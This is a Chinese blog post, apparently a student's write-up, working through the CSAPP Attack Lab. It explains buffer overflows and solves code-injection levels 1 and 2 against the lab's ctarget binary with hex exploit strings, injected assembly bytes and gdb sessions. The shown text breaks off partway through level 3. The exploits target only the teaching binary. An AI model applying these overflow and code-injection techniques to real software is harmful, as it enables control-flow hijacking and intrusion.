@@ -1,0 +1,1103 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <title>
+        CSAPP--Attack Lab实验记录 - lincx blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="google-site-verification" content="4MZdGdeC01hQIYurYzKBAjusQxTyeztil3joPOvIqQc" />
+    
+    <meta name="theme-color" content="#000000" />
+    
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="csapp attack lab实验记录" />
+    <meta name="generator" content="Hugo 0.89.4 with theme pure" />
+    <title>CSAPP--Attack Lab实验记录 - lincx blog</title>
+    
+    
+    <link rel="stylesheet" href="https://www.stana.top/css/style.min.a85959a41e7abcc0db1f81f44bd264649303417f91b536e87dcde644340fea6d.css">
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="CSAPP--Attack Lab实验记录" />
+<meta property="og:description" content="csapp attack lab实验记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.stana.top/2021/12/attack_lab/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-07T23:42:32+08:00" />
+<meta property="article:modified_time" content="2021-12-07T23:42:32+08:00" />
+
+<meta itemprop="name" content="CSAPP--Attack Lab实验记录">
+<meta itemprop="description" content="csapp attack lab实验记录"><meta itemprop="datePublished" content="2021-12-07T23:42:32+08:00" />
+<meta itemprop="dateModified" content="2021-12-07T23:42:32+08:00" />
+<meta itemprop="wordCount" content="5765">
+<meta itemprop="keywords" content="csapp-lab,汇编," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSAPP--Attack Lab实验记录"/>
+<meta name="twitter:description" content="csapp attack lab实验记录"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+  </head>
+
+  
+  
+
+  <body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          
+            <img class="img-circle img-rotate" src="https://www.stana.top/images/avatar.png" width="150" height="150">
+          
+          <h2 id="name" class="hidden-xs hidden-sm">lincx</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">developer</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Guangdong, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><p>enjoy~</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div id="tag-cloud-list" class="widget-body">
+            
+            
+            <a href="https://www.stana.top/tags/csapp-lab/" class="tag-list-link" rel="3">csapp-lab<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://www.stana.top/tags/git-pages/" class="tag-list-link" rel="1">git-pages<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://www.stana.top/tags/gitee/" class="tag-list-link" rel="1">gitee<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://www.stana.top/tags/hugo/" class="tag-list-link" rel="1">hugo<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://www.stana.top/tags/markdown/" class="tag-list-link" rel="1">markdown<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://www.stana.top/tags/vercel/" class="tag-list-link" rel="1">vercel<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://www.stana.top/tags/%E6%B1%87%E7%BC%96/" class="tag-list-link" rel="2">汇编<span
+               class="tag-list-count">2</span></a>
+            
+    </div>
+<script>
+document.onreadystatechange = () => {
+  if (document.readyState === 'complete') {
+    tagCloud('#tag-cloud-list a',  8 ,  20 );
+  }
+};
+
+function tagCloud(where, min, max) {
+  let iMax = 0;
+  let iMin = 0;
+  $(where).each(function() {
+    let weight = Number($(this).attr("rel"));
+    if(iMax < weight) iMax = weight;
+    if(iMin > weight || iMin == 0) iMin = weight;
+  });
+  let step = (max - min)/(iMax - iMin);
+  $(where).each(function() {
+    let weight = $(this).attr("rel") - iMin;
+    $(this).css({"font-size": min + (weight * step) + 'px'});
+  });
+};
+</script>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 分类</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://www.stana.top/categories/csapp/" class="category-list-link">csapp</a><span class="category-list-count">3</span></li>
+            <li class="category-list-item"><a href="https://www.stana.top/categories/tool/" class="category-list-link">tool</a><span class="category-list-count">2</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/csapp-lab/" class="tag-list-link">csapp-lab</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/git-pages/" class="tag-list-link">git-pages</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/gitee/" class="tag-list-link">gitee</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/hugo/" class="tag-list-link">hugo</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/markdown/" class="tag-list-link">markdown</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/vercel/" class="tag-list-link">vercel</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://www.stana.top/tags/%E6%B1%87%E7%BC%96/" class="tag-list-link">汇编</a><span
+                    class="tag-list-count">2</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://www.stana.top/2021/12/attack_lab/" class="title">CSAPP--Attack Lab实验记录</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-07 23:42:32 &#43;0800 CST" itemprop="datePublished">2021-12-07</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://www.stana.top/2021/12/bomb_lab/" class="title">CSAPP--Bomb Lab实验记录</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-06 14:20:42 &#43;0800 CST" itemprop="datePublished">2021-12-06</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://www.stana.top/2021/12/csapp_datalab/" class="title">CSAPP--Data Lab实验记录</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-04 11:31:20 &#43;0800 CST" itemprop="datePublished">2021-12-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://www.stana.top/2021/12/picturebed/" class="title">Gitee PicGo打造免费个人图床</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-03 20:43:32 &#43;0800 CST" itemprop="datePublished">2021-12-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://www.stana.top/2021/12/first/" class="title">hugo搭建个人博客</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-02 18:39:17 &#43;0800 CST" itemprop="datePublished">2021-12-02</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">文章目录</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2021/12/attack_lab/"
+    >CSAPP--Attack Lab实验记录</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://www.stana.top/2021/12/attack_lab/" class="article-date">
+  <time datetime="2021-12-07 23:42:32 &#43;0800 CST" itemprop="datePublished">2021-12-07</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/csapp/"> CSAPP </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/csapp-lab/"> csapp-lab </a>
+    <a class="article-tag-link" href="/tags/%E6%B1%87%E7%BC%96/"> 汇编 </a>
+  </span>
+
+	<span class="article-read hidden-xs">
+    	<i class="icon icon-eye-fill" aria-hidden="true"></i>
+    	<span id="/2021/12/attack_lab/" class="leancloud_visitors"  data-flag-title="CSAPP--Attack Lab实验记录">
+			<span class="leancloud-visitors-count">0</span>
+		</span>
+    </span>
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2021/12/attack_lab/#comments"
+            class="article-comment-link">评论</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 5765字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 12分 </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h1 id="csapp--attack-lab实验记录">CSAPP&ndash;Attack Lab实验记录</h1>
+<p>[toc]</p>
+<h2 id="前言">前言</h2>
+<p>这个实验是csapp lab系列的第三个实验，实验内容主要是通过一些“攻击”手段，让我们了解缓冲区溢出隐患以及如何利用缓冲区溢出对现有的程序进行控制流劫持、执行非法程序&hellip;&hellip;</p>
+<h2 id="实验准备">实验准备</h2>
+<h3 id="实验资料">实验资料</h3>
+<ul>
+<li>《深入理解计算机系统》3.10.2~3.10.5</li>
+<li>实验指导书&ndash;<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">writeup</a></li>
+<li><a href="http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf">GDB的使用</a></li>
+</ul>
+<h3 id="相关知识">相关知识</h3>
+<p>c语言对数组的引用不进行任何边界检查，而局部变量和状态信息（如保存寄存器的值和返回地址）都放到了栈中。多数组进行写操作越界的时候，会破环存储在栈中的状态信息。当程序使用这个被破环的状态，试图重新加载寄存器或执行<code>ret</code>指令时，就会出现很严重的错误。例如，<code>缓冲区溢出</code>。</p>
+<p>下面通过书上的例子，说明问题：</p>
+<pre><code class="language-c">/** echo.c  参照书籍中的代码*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void explosion(){
+    printf(&quot;!!!You touch the explosion&quot;);
+    exit(0);
+}
+
+/* Implementation of library function gets() */
+char *custom_gets(char *s){
+    int c;
+    char *dest = s;
+    while((c = getchar()) != '\n' &amp;&amp; c != EOF)
+        *dest++ = c;
+    if(c == EOF &amp;&amp; dest == s)
+        /* No characters read */
+        return NULL;
+    *dest++ = '\0'; /* Terminate string */
+    return s;
+}
+
+/** Read input line and write it back */
+void echo(){
+    char buf[8];
+    custom_gets(buf);
+    puts(buf);
+}
+
+int main(int argc, char* argv[]){
+    echo();
+    return 0;
+}
+</code></pre>
+<p>检查GCC 为 echo产生的汇编代码，看看栈是如何组织的：</p>
+<pre><code class="language-ABAP">echo:
+    subq    $24, %rsp
+    movq    %rsp, %rdi
+    call    custom_gets
+    movq    %rsp, %rdi
+    call    puts
+    addq    $24, %rsp
+    ret
+</code></pre>
+<p>从汇编代码中可以看出，该程序在栈上为字符数组分配了24个字节。所以用户定义的字符数组为8个字节，意味着即使用户输入超过8个字节也不一定会对栈的状态信息造成破坏。但是如果用户输入超过23个字节，则会将echo的返回地址给破坏，这就是缓冲区溢出漏洞。</p>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211208143409947.png" alt="image-20211208143409947"></p>
+<h3 id="实验目录">实验目录</h3>
+<p>首先下载实验文件，然后解压，可以看到lab的目录如下：</p>
+<ul>
+<li>
+<p><code>cookie.txt</code> 一个8为16进行数，作为攻击的特殊标志符</p>
+</li>
+<li>
+<p><code>farm.c</code> 在ROP攻击中作为gadgets的产生源</p>
+</li>
+<li>
+<p><code>ctarget</code> 代码注入攻击的目标文件</p>
+</li>
+<li>
+<p><code>rtarget</code> ROP攻击的目标文件</p>
+</li>
+<li>
+<p><code>hex2row</code> 将16进制数转化为攻击字符，因为有些字符在屏幕上面无法输入，所以输入该字符的16进制数，自动转化为该字符</p>
+</li>
+</ul>
+<h2 id="实验内容">实验内容</h2>
+<h3 id="part-i-code-injection-attacks">Part I: Code Injection Attacks</h3>
+<h4 id="level-1">level 1</h4>
+<p>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure.</p>
+<p>Function getbuf is called within CTARGET by a function test having the following C code:</p>
+<pre><code class="language-c"> void test()
+{
+     int val;
+     val = getbuf();
+     printf(&quot;No exploit. Getbuf returned 0x%x\n&quot;, val);
+}
+
+</code></pre>
+<p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:</p>
+<pre><code class="language-c">void touch1()
+{
+    vlevel = 1; /* Part of validation protocol */
+    printf(&quot;Touch1!: You called touch1()\n&quot;);
+    validate(1);
+    exit(0);
+}
+
+</code></pre>
+<p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.</p>
+<p><strong>Some Advice</strong>:</p>
+<ul>
+<li>All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.</li>
+<li>The idea is to position a byte representation of the starting address for touch1 so that the ret instruction at the end of the code for getbuf will transfer control to touch1.</li>
+<li>Be careful about byte ordering. •</li>
+<li>You might want to use GDB to step the program through the last few instructions of getbuf to make sure it is doing the right thing.</li>
+<li>The placement of buf within the stack frame for getbuf depends on the value of compile-time constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the disassembled code to determine its position.</li>
+</ul>
+<p>上面是level 的实验任务介绍，大体意思就是让我们对 <code>ctarget</code>这个程序的<code>test</code>函数中调用的<code>getbuf</code>函数进行输入内容，利用溢出，调用<code>touch1</code>函数。</p>
+<p>首先我们可以反编译整个<code>ctarget</code>输出内容dao<code>ctarget.asm</code>文件中（推荐）</p>
+<pre><code class="language-shell">$ objdump -d ctarget &gt; ctarget.asm 
+</code></pre>
+<p>这样就可以得到整个程序的汇编内容。或者也可以利用gdb <code>disas</code>命令查看想要查看的函数的汇编代码：</p>
+<pre><code class="language-ABAP">(gdb) disas touch1
+Dump of assembler code for function touch1:
+   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp
+   0x00000000004017c4 &lt;+4&gt;:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;
+   0x00000000004017ce &lt;+14&gt;:    mov    $0x4030c5,%edi
+   0x00000000004017d3 &lt;+19&gt;:    callq  0x400cc0 &lt;puts@plt&gt;
+   0x00000000004017d8 &lt;+24&gt;:    mov    $0x1,%edi
+   0x00000000004017dd &lt;+29&gt;:    callq  0x401c8d &lt;validate&gt;
+   0x00000000004017e2 &lt;+34&gt;:    mov    $0x0,%edi
+   0x00000000004017e7 &lt;+39&gt;:    callq  0x400e40 &lt;exit@plt&gt;
+</code></pre>
+<p>而我们现在主要需要关注的是<code>test</code>跟<code>getbuf</code>函数，因为要观察它们的缓冲区大小，才能直到溢出的临界值是多少，在<code>ctarget.asm </code>文件中查找这两个函数名，得到它们的汇编代码：</p>
+<pre><code class="language-ABAP">00000000004017a8 &lt;getbuf&gt;:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+  4017be:	90                   	nop
+  4017bf:	90                   	nop
+  
+  ......
+  
+  0000000000401968 &lt;test&gt;:
+  401968:	48 83 ec 08          	sub    $0x8,%rsp
+  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
+  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;
+  401976:	89 c2                	mov    %eax,%edx
+  401978:	be 88 31 40 00       	mov    $0x403188,%esi
+  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
+  401982:	b8 00 00 00 00       	mov    $0x0,%eax
+  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
+  40198c:	48 83 c4 08          	add    $0x8,%rsp
+  401990:	c3                   	retq   
+  401991:	90                   	nop
+  401992:	90                   	nop
+  401993:	90                   	nop
+  401994:	90                   	nop
+  401995:	90                   	nop
+  401996:	90                   	nop
+  401997:	90                   	nop
+  401998:	90                   	nop
+  401999:	90                   	nop
+  40199a:	90                   	nop
+  40199b:	90                   	nop
+  40199c:	90                   	nop
+  40199d:	90                   	nop
+  40199e:	90                   	nop
+  40199f:	90                   	nop
+  
+
+</code></pre>
+<p>可以看到<code>sub    $0x28,%rsp</code>这里就是在栈上分配给缓冲区的大小空间：0x28 = 40字节。所以只需要在输入40字节内容 后面再加上 <code>touch1</code>的地址的话，就能将原来test函数的地址覆盖，<code>retq</code>指令将跳转到<code>touch1</code>。我们试验一下：</p>
+<p>首先，查看一下<code>touch1</code>的地址</p>
+<pre><code class="language-ABAP">0x00000000004017c0
+</code></pre>
+<p>然后新建一个文件<code>ctarget.l1.txt</code>用来存储我们输入的内容，这里前40个字节 都用 00 来填充，最后输入<code>touch1</code>的地址，注意，这里的地址是反过来写，因为机器存的是<code>小端序</code>，低位字节存在低位地址:</p>
+<pre><code class="language-shell">$ vim ctarget.l1.txt
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
+
+</code></pre>
+<p>然后运行看看结果：</p>
+<pre><code class="language-she">$ ./hex2raw -i ctarget.l1.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
+</code></pre>
+<p>顺利完成！</p>
+<h4 id="level-2">level 2</h4>
+<p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:</p>
+<pre><code class="language-c"> void touch2(unsigned val)
+ {
+     vlevel = 2; /* Part of validation protocol */
+ 	if (val == cookie) {
+        printf(&quot;Touch2!: You called touch2(0x%.8x)\n&quot;, val);
+        validate(2);
+     } else {
+        printf(&quot;Misfire: You called touch2(0x%.8x)\n&quot;, val);
+        fail(2);
+     }
+ 	exit(0);
+ }
+
+</code></pre>
+<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p>
+<p><strong>Some Advice</strong>:</p>
+<ul>
+<li>You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.</li>
+<li>Recall that the first argument to a function is passed in register %rdi.</li>
+<li>Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.</li>
+<li>Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.</li>
+<li>See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.</li>
+</ul>
+<p>从上文可以看到，这个任务主要是让我们注入一段代码，执行<code>touch2</code>函数，然后比较传入的val是否与cookie值相等，相等则成功。实验要求我们不能通过<code>jmp</code>或者<code>call</code>指令来跳转，只能通过<code>ret</code>。</p>
+<p><code>ret</code>是从栈上弹出返回地址，所以要想跳转至<code>touch2</code>，那么我们就需要在栈顶弹入<code>touch2</code>的地址。</p>
+<p>所以我们可以先整理一下思路：</p>
+<ol>
+<li>在<code>ctarget.asm</code>文件中查看<code>touch2</code>函数的地址</li>
+<li>编写插入的汇编代码，然后编译得到指令</li>
+<li>将指令插入到我们需要输入的字符串开头</li>
+<li>在末尾插入跳转的地址（%rsp）</li>
+</ol>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211208163227518.png" alt="image-20211208163227518"></p>
+<p>首先，查看<code>touch2</code>函数的地址</p>
+<pre><code>0x4017ec
+</code></pre>
+<p>接着，获取<code>%rsp</code> 的值<code>0x5561dc78</code></p>
+<pre><code class="language-shell">$ gdb ctarget
+
+(gdb) break getbuf
+Breakpoint 1 at 0x4017a8: file buf.c, line 12.
+(gdb) run -q
+Starting program: /home/lincx/c++/CSAPP-Labs-master/labs/source/labfile/target1/ctarget -q
+Cookie: 0x59b997fa
+
+Breakpoint 1, getbuf () at buf.c:12
+12      buf.c: No such file or directory.
+(gdb) stepi
+14      in buf.c
+(gdb) p /x %rsp
+A syntax error in expression, near `%rsp'.
+(gdb) p /x $rsp
+$1 = 0x5561dc78
+</code></pre>
+<p>然后，新建<code>ctarget.s</code>文件编写插入的汇编代码：</p>
+<pre><code class="language-ABAP">mov   $0x59b997fa,%rdi
+pushq $0x4017ec
+ret
+</code></pre>
+<p>编译，得到汇编指令<code>48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3</code>：</p>
+<pre><code class="language-shell">$ objdump -d ctarget2.o &gt; ctarget2insert.asm
+
+$ vim ctarget2insert.asm
+
+
+ctarget2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 ec 17 40 00    pushq  0x4017ec
+   e:   c3                      retq
+</code></pre>
+<p>构造输入字符，新建<code>ctarget.l2.txt</code>：</p>
+<pre><code class="language-shell">$ vim ctarget.l2.txt
+
+48 c7 c7 fa 97 b9 59 68 ec 17
+40 00 c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+</code></pre>
+<p>执行命令，查看结果：</p>
+<pre><code class="language-shell">$  ./hex2raw -i ctarget.l2.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
+</code></pre>
+<h4 id="level-3">level 3</h4>
+<p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p>
+<pre><code class="language-c">/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval){
+	char cbuf[110];
+	/* Make position of check string unpredictable */
+	char *s = cbuf + random() % 100;
+	sprintf(s, &quot;%.8x&quot;, val);
+	return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval){
+    vlevel = 3;
+    if (hexmatch(cookie, sval)){
+        printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        validate(3);
+    } else {
+        printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        fail(3);
+    }
+    exit(0);
+}
+</code></pre>
+<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p>
+<p><strong>Some Advice:</strong></p>
+<ul>
+<li>You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”</li>
+<li>Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.</li>
+<li>Your injected code should set register %rdi to the address of this string.</li>
+<li>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.</li>
+</ul>
+<p>与前面不同的是，这次传进的参数是一个字符串，同时函数内部用了另外一个函数来比较。本次要 比较的是<code>&quot;59b997fa&quot;</code>这个字符串。</p>
+<p>上面提示的第四点，当调用<code>hexmatch</code>和<code>strncmp</code>时，他们会把数据压入到栈中，有可能会覆盖<code>getbuf</code>栈帧的数据，所以传进去字符串的位置必须小心谨慎。</p>
+<pre><code class="language-c">char *s = cbuf + random() % 100;
+</code></pre>
+<p>这一行，<code>s</code>的位置是随机的，可能覆盖掉之前<code>getbuf</code>的内容。所以不能将字符串保存在<code>getbuf</code>中，我们可以将字符串保存到父栈帧<code>test</code>中。</p>
+<pre><code class="language-shell">(gdb) disas test
+Dump of assembler code for function test:
+   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp
+   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax
+   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt;
+   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx
+   0x0000000000401978 &lt;+16&gt;:    mov    $0x403188,%esi
+   0x000000000040197d &lt;+21&gt;:    mov    $0x1,%edi
+   0x0000000000401982 &lt;+26&gt;:    mov    $0x0,%eax
+   0x0000000000401987 &lt;+31&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;
+   0x000000000040198c &lt;+36&gt;:    add    $0x8,%rsp
+   0x0000000000401990 &lt;+40&gt;:    retq
+(gdb) break *0x40196c
